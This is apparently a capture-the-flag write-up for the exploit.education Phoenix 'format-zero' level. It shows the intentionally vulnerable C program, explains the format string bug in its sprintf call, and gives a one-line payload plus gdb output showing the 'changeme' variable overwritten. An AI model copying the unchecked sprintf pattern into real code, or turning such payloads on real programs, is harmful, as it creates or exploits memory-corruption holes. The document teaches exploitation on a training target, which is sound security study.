# FORMAT ZERO

## SOURCE CODE

```c
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

## STRATEGY

The vulnerability is the "format string", so if you don't know it, this is a simple guide:

https://secgroup.dais.unive.it/teaching/security-course/format-strings/.

Back to problem, we can write up to 15 bytes in a 32 bytes buffer called "'dest'". The goal is overflow the buffer and overwrite the variable "'changeme'", that is possible thanks to a format string injection because during sprintf there is not format strings directives, so any format string will be interpreted. Injecting a format string with buffer dimension plus any value will give us the victory!

## EXPLOIT

```python
python -c 'print "%32xAAAA"' | ./format-zero'
```

You can manually check the result with gdb, checking the variable changeme (ebp-0xc) before and after sprintf

``` gdb
gef➤  x $ebp-0xc
0xffffd5dc:	0x00000000
```

```gdb
gef➤  x $ebp-0xc
0xffffd5dc:	0x41414141
```


